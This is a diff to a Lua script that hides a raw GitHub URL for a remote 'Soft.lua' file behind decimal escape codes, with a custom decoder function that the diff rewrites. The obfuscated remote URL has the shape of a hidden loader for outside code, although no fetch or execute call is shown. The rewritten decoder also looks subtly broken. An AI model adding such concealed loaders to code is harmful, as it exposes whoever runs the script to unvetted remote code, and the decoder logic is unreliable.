@@ -55,10 +55,23 @@
 
 local a = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
 local function b(b1)
-    local b2, b3, b4, b5 = "", 1, nil, nil
-    while b3 ~= "" do
-        b3, b4, b5 = b1:match("^(.-)(\\(%d+))", b3 and b3:len() + 1 or 1)
-        b2 = b2 .. b3 .. (b5 and string.char(tonumber(b5)) or "")
+    local b2 = ""
+    local pos = 1
+    while pos <= #b1 do
+        if b1:sub(pos, pos + 1) == "\\" then
+            local numStr = b1:sub(pos + 2, pos + 4)
+            local num = tonumber(numStr)
+            if num then
+                b2 = b2 .. string.char(num)
+                pos = pos + 5
+            else
+                b2 = b2 .. b1:sub(pos, pos + 4)
+                pos = pos + 5
+            end
+        else
+            b2 = b2 .. b1:sub(pos, pos)
+            pos = pos + 1
+        end
     end
     return b2
 end
